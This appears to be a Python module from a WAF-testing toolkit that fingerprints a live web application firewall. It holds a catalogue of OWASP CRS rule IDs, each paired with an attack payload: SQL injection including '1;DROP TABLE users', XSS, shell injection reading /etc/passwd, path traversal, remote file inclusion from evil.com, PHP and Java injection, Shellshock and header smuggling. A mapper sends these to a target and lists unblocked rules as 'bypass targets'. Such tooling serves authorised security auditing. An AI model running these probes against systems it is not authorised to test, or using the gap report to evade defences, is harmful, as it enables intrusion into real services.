"""WAF rule reverse engineering — reconstruct the target WAF's rule set from black-box probing.

Sends payloads designed to trigger specific known rules (primarily OWASP CRS)
and observes which are blocked vs passed. From the pattern of blocks, infer:
  - Which rule engine is running (CRS, custom, cloud)
  - Which paranoia level is active (CRS PL1–PL4)
  - Which individual rules are active vs disabled
  - Gaps: rules expected to block that don't → bypass targets

Usage:
    mapper = RuleMapper(target)
    report = mapper.map_rules()
    print(report.summary())
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Sequence, Optional

from ..core.oracle import Oracle, Target, BLOCKED, THROUGH


# ---------------------------------------------------------------------------
# CRS rule signature database
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class RuleSignature:
    rule_id: str
    description: str
    category: str          # sqli, xss, rce, lfi, rfi, protocol, scanner, php, java, session, multipart
    paranoia_level: int    # 1-4
    trigger_payload: str
    false_positive_risk: str = "low"  # low / medium / high


# --- SQLi rules (942xxx) ---------------------------------------------------

_SQLI_RULES = [
    # PL1 — baseline
    RuleSignature("942100", "SQLi via libinjection (fingerprint)", "sqli", 1,
                  "' OR 1=1--"),
    RuleSignature("942110", "SQLi attack: common injection testing", "sqli", 1,
                  "1 UNION SELECT NULL,NULL"),
    RuleSignature("942120", "SQLi operator detection", "sqli", 1,
                  "1' OR '1'='1"),
    RuleSignature("942130", "SQL boolean tautology", "sqli", 1,
                  "1' OR 'x'='x'--"),
    RuleSignature("942140", "SQLi DB object names", "sqli", 1,
                  "information_schema.tables"),
    RuleSignature("942150", "SQL function names", "sqli", 1,
                  "CONCAT(0x7e,version())"),
    RuleSignature("942160", "UNION-based SQLi (match)", "sqli", 1,
                  "UNION ALL SELECT 1,2,3,4"),
    RuleSignature("942170", "SQLi benchmark/sleep", "sqli", 1,
                  "BENCHMARK(10000000,SHA1('test'))"),
    RuleSignature("942180", "Basic SQL auth bypass attempts", "sqli", 1,
                  "admin' --"),
    RuleSignature("942190", "MSSQL code execution", "sqli", 1,
                  "EXEC xp_cmdshell('whoami')"),
    RuleSignature("942200", "MySQL comment/space obfuscated injection", "sqli", 1,
                  "/*!50000UNION*/SELECT"),
    RuleSignature("942210", "Chained SQL injection 1/2", "sqli", 1,
                  "1;DROP TABLE users"),
    RuleSignature("942220", "Integer overflow attack", "sqli", 1,
                  "99999999999999999 OR 1=1"),
    RuleSignature("942230", "Conditional SQLi attempts", "sqli", 1,
                  "IF(1=1,1,0)"),
    RuleSignature("942240", "MySQL charset switch", "sqli", 1,
                  "SET NAMES utf8"),
    RuleSignature("942250", "MATCH AGAINST injection", "sqli", 1,
                  "MATCH(col) AGAINST('term')"),
    RuleSignature("942260", "Basic SQL auth bypass 2/3", "sqli", 1,
                  "' OR 1=1#"),
    RuleSignature("942270", "SQLi: common injection (string termination)", "sqli", 1,
                  "1' AND '1'='1"),
    RuleSignature("942280", "Postgres pg_sleep", "sqli", 1,
                  "pg_sleep(5)"),
    RuleSignature("942290", "MongoDB injection", "sqli", 1,
                  '{"$gt":""}'),
    # PL2
    RuleSignature("942300", "MySQL comment detection", "sqli", 2,
                  "'/**/OR/**/1=1--"),
    RuleSignature("942310", "Chained SQL injection 2/2", "sqli", 2,
                  "1; SELECT * FROM users"),
    RuleSignature("942320", "MySQL/PG stored procedure/function inject", "sqli", 2,
                  "CALL sp_executesql('SELECT 1')"),
    RuleSignature("942330", "Classic SQL injection probing 1/2", "sqli", 2,
                  "' HAVING 1=1--"),
    RuleSignature("942340", "Basic SQL auth bypass 3/3", "sqli", 2,
                  "admin'/*"),
    RuleSignature("942350", "MySQL UDF injection", "sqli", 2,
                  "SELECT LOAD_FILE('/etc/passwd')"),
    RuleSignature("942360", "Concatenated basic SQLi and SQLFNI", "sqli", 2,
                  "CONCAT('sel','ect')"),
    RuleSignature("942370", "Classic SQL injection probing 2/2", "sqli", 2,
                  "1' GROUP BY 1--"),
    RuleSignature("942380", "SQL injection attack", "sqli", 2,
                  "EXTRACTVALUE(1,CONCAT(0x7e,version()))"),
    RuleSignature("942390", "SQL injection (common DB function)", "sqli", 2,
                  "UPDATEXML(1,CONCAT(0x7e,version()),1)"),
    # PL3
    RuleSignature("942400", "SQL comment sequence (PL3)", "sqli", 3,
                  "1--"),
    RuleSignature("942410", "SQL hex encoding", "sqli", 3,
                  "0x48454C4C4F"),
    RuleSignature("942420", "Restricted SQL character anomaly (PL3)", "sqli", 3,
                  "1' AND 1"),
    RuleSignature("942430", "Restricted SQL char anomaly: # of special chars exceeded", "sqli", 3,
                  "';!@#$%"),
    RuleSignature("942440", "SQL comment sequence detected", "sqli", 3,
                  "/*test*/"),
    RuleSignature("942450", "SQL hex encoding identified", "sqli", 3,
                  "CHAR(0x41)"),
    RuleSignature("942460", "Meta character anomaly alert (repetitive non-word)", "sqli", 3,
                  "((((((((((", "high"),
    # PL4
    RuleSignature("942470", "SQL injection (string termination PL4)", "sqli", 4,
                  "'test", "high"),
    RuleSignature("942480", "SQL injection (comment PL4)", "sqli", 4,
                  "SELECT 1", "high"),
]

# --- XSS rules (941xxx) ----------------------------------------------------

_XSS_RULES = [
    # PL1
    RuleSignature("941100", "XSS via libinjection", "xss", 1,
                  "<script>alert(1)</script>"),
    RuleSignature("941110", "XSS filter Category 1: script tag vector", "xss", 1,
                  "<script>var i=1</script>"),
    RuleSignature("941120", "XSS filter Category 2: event handler", "xss", 1,
                  "<img src=x onerror=alert(1)>"),
    RuleSignature("941130", "XSS filter Category 3: attribute vector", "xss", 1,
                  "<a href=javascript:alert(1)>"),
    RuleSignature("941140", "XSS filter Category 4: javascript URI", "xss", 1,
                  "javascript:alert(document.cookie)"),
    RuleSignature("941150", "XSS filter Category 5: disallowed HTML attr", "xss", 1,
                  "<div style='background:url(javascript:alert(1))'>"),
    RuleSignature("941160", "NoScript XSS InjectionChecker: HTML injection", "xss", 1,
                  "<svg onload=alert(1)>"),
    RuleSignature("941170", "NoScript XSS InjectionChecker: attribute inject", "xss", 1,
                  "<body onload=alert(1)>"),
    RuleSignature("941180", "Node-validator blacklist keywords", "xss", 1,
                  "<iframe src='data:text/html,<script>alert(1)</script>'>"),
    RuleSignature("941190", "XSS using style sheets", "xss", 1,
                  '<div style="xss:expression(alert(1))">'),
    RuleSignature("941200", "XSS using VML frames", "xss", 1,
                  "<xml><![CDATA[<script>alert(1)</script>]]></xml>"),
    RuleSignature("941210", "IE XSS filter evasion 1", "xss", 1,
                  "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"),
    RuleSignature("941220", "IE XSS filter evasion 2 (import)", "xss", 1,
                  '<link rel="stylesheet" href="javascript:alert(1)">'),
    RuleSignature("941230", "IE XSS filter evasion 3 (embed)", "xss", 1,
                  "<embed src='data:text/html,<script>alert(1)</script>'>"),
    RuleSignature("941240", "IE XSS filter evasion 4 (import/on*)", "xss", 1,
                  '<object data="javascript:alert(1)">'),
    RuleSignature("941250", "IE XSS filter evasion 5 (marquee)", "xss", 1,
                  "<marquee onstart=alert(1)>"),
    RuleSignature("941260", "IE XSS filter evasion 6 (base tag)", "xss", 1,
                  "<base href='javascript:alert(1)//'>"),
    RuleSignature("941270", "IE XSS filter evasion 7 (backtick)", "xss", 1,
                  "<img src=x onerror=`alert(1)`>"),
    # PL2
    RuleSignature("941310", "US-ASCII malformed encoding XSS filter", "xss", 2,
                  "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;"),
    RuleSignature("941320", "Possible XSS attack: HTML tag handler", "xss", 2,
                  "<details open ontoggle=alert(1)>"),
    RuleSignature("941330", "IE XSS filters: attack detected (concat)", "xss", 2,
                  "''+alert(1)+'"),
    RuleSignature("941340", "IE XSS filters: attack detected (call)", "xss", 2,
                  "alert.call(null,1)"),
    # PL3
    RuleSignature("941350", "UTF-7 encoding XSS", "xss", 3,
                  "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"),
    RuleSignature("941360", "JSFuck obfuscation detected", "xss", 3,
                  "[][(![]+[])[+[]]+(![]+[])]"),
]

# --- RCE rules (932xxx) ----------------------------------------------------

_RCE_RULES = [
    RuleSignature("932100", "Remote command execution (Unix)", "rce", 1,
                  "; cat /etc/passwd"),
    RuleSignature("932105", "Remote command execution (Unix 2)", "rce", 1,
                  "| ls -la"),
    RuleSignature("932110", "Remote command execution (Windows)", "rce", 1,
                  "& dir C:\\"),
    RuleSignature("932115", "Remote command execution (Windows 2)", "rce", 1,
                  "| type C:\\boot.ini"),
    RuleSignature("932120", "Remote command execution (PowerShell)", "rce", 1,
                  "powershell -exec bypass -c whoami"),
    RuleSignature("932130", "Remote command execution (Unix shell expr)", "rce", 1,
                  "$(whoami)"),
    RuleSignature("932140", "Remote command execution (backtick)", "rce", 1,
                  "`id`"),
    RuleSignature("932150", "Remote command exec (direct Unix)", "rce", 1,
                  "/bin/bash -c 'id'"),
    RuleSignature("932160", "Remote command exec (Unix subshell/pipe)", "rce", 2,
                  "a]||id;"),
    RuleSignature("932170", "Remote command execution: Shellshock", "rce", 1,
                  "() { :;}; /bin/cat /etc/passwd"),
    RuleSignature("932180", "Restricted file upload attempt", "rce", 1,
                  "cmd.exe /c whoami"),
]

# --- LFI / path traversal (930xxx) -----------------------------------------

_LFI_RULES = [
    RuleSignature("930100", "Path traversal attack (/../)", "lfi", 1,
                  "../../etc/passwd"),
    RuleSignature("930110", "Path traversal attack (/../) 2", "lfi", 1,
                  "..\\..\\windows\\system32\\config\\sam"),
    RuleSignature("930120", "OS file access attempt", "lfi", 1,
                  "/etc/shadow"),
    RuleSignature("930130", "Restricted file access", "lfi", 1,
                  ".htaccess"),
    RuleSignature("930140", "URL encoded path traversal", "lfi", 1,
                  "%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    RuleSignature("930150", "Double URL encoded traversal", "lfi", 2,
                  "%252e%252e%252fetc%252fpasswd"),
    RuleSignature("930160", "Unicode encoded traversal", "lfi", 2,
                  "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"),
]

# --- RFI (931xxx) -----------------------------------------------------------

_RFI_RULES = [
    RuleSignature("931100", "Remote file inclusion (IP in arg)", "rfi", 1,
                  "http://192.168.1.1/shell.txt"),
    RuleSignature("931110", "Remote file inclusion (common param)", "rfi", 1,
                  "http://evil.com/cmd.php?cmd=ls"),
    RuleSignature("931120", "Remote file inclusion (trailing ?)", "rfi", 2,
                  "http://evil.com/shell.php?"),
    RuleSignature("931130", "Remote file inclusion (off-domain ref)", "rfi", 2,
                  "ftp://evil.com/pub/shell"),
]

# --- Protocol (921xxx) ------------------------------------------------------

_PROTOCOL_RULES = [
    RuleSignature("921100", "HTTP request smuggling (CR/LF)", "protocol", 1,
                  "GET / HTTP/1.1\r\nTransfer-Encoding: chunked"),
    RuleSignature("921110", "HTTP request smuggling (Transfer-Enc)", "protocol", 1,
                  "Transfer-Encoding: chunked"),
    RuleSignature("921120", "HTTP response splitting", "protocol", 1,
                  "header%0d%0aInjected: true"),
    RuleSignature("921130", "HTTP response splitting 2", "protocol", 2,
                  "%0d%0a%0d%0a<html>Injected</html>"),
    RuleSignature("921140", "HTTP header injection via headers", "protocol", 2,
                  "Host: evil.com\r\nX-Injected: true"),
    RuleSignature("921150", "HTTP header injection via payload (CR/LF)", "protocol", 1,
                  "%0d%0aContent-Length:%200"),
    RuleSignature("921160", "HTTP header injection via payload (CR/LF/HT)", "protocol", 1,
                  "%0d%0a%09Injected"),
]

# --- Scanner / bot (913xxx) -------------------------------------------------

_SCANNER_RULES = [
    RuleSignature("913100", "Security scanner detection (UA)", "scanner", 1,
                  "User-Agent: Nikto"),
    RuleSignature("913110", "Security scanner detection (header)", "scanner", 1,
                  "X-Scanner: true"),
    RuleSignature("913120", "Request filename/arg scanner detection", "scanner", 2,
                  "test.asp?cmd=dir"),
]

# --- PHP (933xxx) -----------------------------------------------------------

_PHP_RULES = [
    RuleSignature("933100", "PHP injection: opening/closing tag", "php", 1,
                  "<?php echo shell_exec('id'); ?>"),
    RuleSignature("933110", "PHP injection: upload/fopen function", "php", 1,
                  "php://input"),
    RuleSignature("933120", "PHP injection: config directive", "php", 1,
                  "auto_prepend_file=php://input"),
    RuleSignature("933130", "PHP injection: variable", "php", 1,
                  "$_GET['cmd']"),
    RuleSignature("933140", "PHP injection: I/O stream", "php", 1,
                  "php://filter/convert.base64-encode/resource=/etc/passwd"),
    RuleSignature("933150", "PHP injection: high-risk function name", "php", 1,
                  "eval(base64_decode('dGVzdA=='))"),
    RuleSignature("933160", "PHP injection: high-risk function call", "php", 2,
                  "assert('system(\"id\")')"),
    RuleSignature("933170", "PHP injection: serialized object", "php", 2,
                  'O:4:"Test":1:{s:3:"cmd";s:2:"id";}'),
    RuleSignature("933180", "PHP injection: variable function call", "php", 2,
                  "$func = 'system'; $func('id');"),
    RuleSignature("933200", "PHP injection: wrapper scheme", "php", 2,
                  "expect://id"),
    RuleSignature("933210", "PHP injection: common function names (PL2)", "php", 3,
                  "passthru('id')"),
]

# --- Java (944xxx) ----------------------------------------------------------

_JAVA_RULES = [
    RuleSignature("944100", "Remote command exec via Java (deserialization)", "java", 1,
                  "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA"),
    RuleSignature("944110", "Possible attack on Java app", "java", 1,
                  ".class.getClassLoader()"),
    RuleSignature("944120", "Remote cmd exec and file access", "java", 1,
                  "Runtime.getRuntime().exec('id')"),
    RuleSignature("944130", "Suspicious Java class", "java", 2,
                  "java.lang.ProcessBuilder"),
    RuleSignature("944200", "Magic bytes detected Java serialization", "java", 1,
                  "\\xac\\xed\\x00\\x05"),
    RuleSignature("944210", "Magic bytes compress Java serialization", "java", 2,
                  "H4sIAAAAAAAA"),
]

# --- Session fixation / SSRF ------------------------------------------------

_MISC_RULES = [
    RuleSignature("943100", "Session fixation (cookie set in args)", "session", 1,
                  "JSESSIONID=abc123"),
    RuleSignature("943110", "Session fixation (off-domain referrer)", "session", 2,
                  "SessionID=evil"),
    RuleSignature("934100", "SSI injection", "ssi", 1,
                  '<!--#exec cmd="id"-->'),
]


# -- Aggregate ---------------------------------------------------------------

CRS_RULES: list[RuleSignature] = (
    _SQLI_RULES + _XSS_RULES + _RCE_RULES + _LFI_RULES +
    _RFI_RULES + _PROTOCOL_RULES + _SCANNER_RULES +
    _PHP_RULES + _JAVA_RULES + _MISC_RULES
)

CATEGORIES = sorted({r.category for r in CRS_RULES})


# ---------------------------------------------------------------------------
# Probe result & report
# ---------------------------------------------------------------------------

@dataclass
class RuleProbe:
    rule: RuleSignature
    blocked: bool
    code: str = ""


@dataclass
class RuleMapReport:
    waf_type: str = "unknown"
    estimated_paranoia_level: int = 0
    rules_active: list[RuleSignature] = field(default_factory=list)
    rules_inactive: list[RuleSignature] = field(default_factory=list)
    categories: dict = field(default_factory=dict)
    gaps: list[RuleSignature] = field(default_factory=list)
    probes: list[RuleProbe] = field(default_factory=list)
    total_probes: int = 0

    def summary(self) -> str:
        lines = [
            f"WAF type: {self.waf_type}",
            f"Estimated paranoia level: PL{self.estimated_paranoia_level}" if self.estimated_paranoia_level else "Paranoia level: N/A (non-CRS)",
            f"Rules active: {len(self.rules_active)}/{self.total_probes}",
            f"Rules inactive (gaps): {len(self.rules_inactive)}",
            "",
        ]
        for cat in sorted(self.categories):
            info = self.categories[cat]
            pct = info["active"] / info["total"] * 100 if info["total"] else 0
            pl_parts = []
            for pl in sorted(info.get("by_pl", {})):
                pldata = info["by_pl"][pl]
                pl_pct = pldata["active"] / pldata["total"] * 100 if pldata["total"] else 0
                pl_parts.append(f"PL{pl}: {pl_pct:.0f}%")
            pl_str = " — " + ", ".join(pl_parts) if pl_parts else ""
            lines.append(f"  {cat:12s} {info['active']:3d}/{info['total']:3d} active ({pct:.0f}%){pl_str}")
        if self.gaps:
            lines.append("")
            lines.append("GAPS (inactive rules — bypass targets):")
            for g in self.gaps:
                lines.append(f"  {g.rule_id} (PL{g.paranoia_level}) {g.description} → {g.trigger_payload[:50]}")
        return "\n".join(lines)

    def as_dict(self) -> dict:
        return {
            "waf_type": self.waf_type,
            "paranoia_level": self.estimated_paranoia_level,
            "active": len(self.rules_active),
            "inactive": len(self.rules_inactive),
            "total": self.total_probes,
            "categories": self.categories,
            "gaps": [{"rule_id": g.rule_id, "description": g.description,
                      "category": g.category, "pl": g.paranoia_level,
                      "payload": g.trigger_payload} for g in self.gaps],
        }


# ---------------------------------------------------------------------------
# The mapper
# ---------------------------------------------------------------------------

class RuleMapper:
    """Probe a live WAF to reconstruct its rule set."""

    def __init__(self, target: Target, sender=None):
        self.target = target
        self._sender = sender

    def _oracle(self) -> Oracle:
        return Oracle(self.target, sender=self._sender)

    def map_rules(self) -> RuleMapReport:
        oracle = self._oracle()
        probes: list[RuleProbe] = []
        for sig in CRS_RULES:
            resp = oracle.send(sig.trigger_payload)
            probes.append(RuleProbe(rule=sig, blocked=(resp.verdict == BLOCKED), code=resp.code))
        return self._analyze(probes)

    def _analyze(self, probes: list[RuleProbe]) -> RuleMapReport:
        report = RuleMapReport(total_probes=len(probes), probes=probes)

        active = [p.rule for p in probes if p.blocked]
        inactive = [p.rule for p in probes if not p.blocked]
        report.rules_active = active
        report.rules_inactive = inactive
        report.gaps = inactive

        # Category breakdown
        cats: dict = {}
        for p in probes:
            cat = p.rule.category
            if cat not in cats:
                cats[cat] = {"active": 0, "total": 0, "by_pl": {}}
            cats[cat]["total"] += 1
            if p.blocked:
                cats[cat]["active"] += 1
            pl = p.rule.paranoia_level
            if pl not in cats[cat]["by_pl"]:
                cats[cat]["by_pl"][pl] = {"active": 0, "total": 0}
            cats[cat]["by_pl"][pl]["total"] += 1
            if p.blocked:
                cats[cat]["by_pl"][pl]["active"] += 1
        report.categories = cats

        # Determine WAF type and paranoia level
        block_rate = len(active) / len(probes) if probes else 0
        if block_rate > 0.1:
            report.waf_type = "CRS-like"
        elif block_rate > 0:
            report.waf_type = "custom"
        else:
            report.waf_type = "none-or-passthrough"

        report.estimated_paranoia_level = self._detect_paranoia(probes)
        return report

    @staticmethod
    def _detect_paranoia(probes: list[RuleProbe]) -> int:
        """Estimate CRS paranoia level from which PL-tiers are blocked."""
        pl_stats: dict[int, dict] = {}
        for p in probes:
            pl = p.rule.paranoia_level
            if pl not in pl_stats:
                pl_stats[pl] = {"active": 0, "total": 0}
            pl_stats[pl]["total"] += 1
            if p.blocked:
                pl_stats[pl]["active"] += 1

        detected = 0
        for pl in sorted(pl_stats):
            stats = pl_stats[pl]
            rate = stats["active"] / stats["total"] if stats["total"] else 0
            if rate >= 0.5:
                detected = pl
            else:
                break
        return detected


def write_rulemap_json(report: RuleMapReport, path: str):
    with open(path, "w") as f:
        json.dump(report.as_dict(), f, indent=2, ensure_ascii=False)
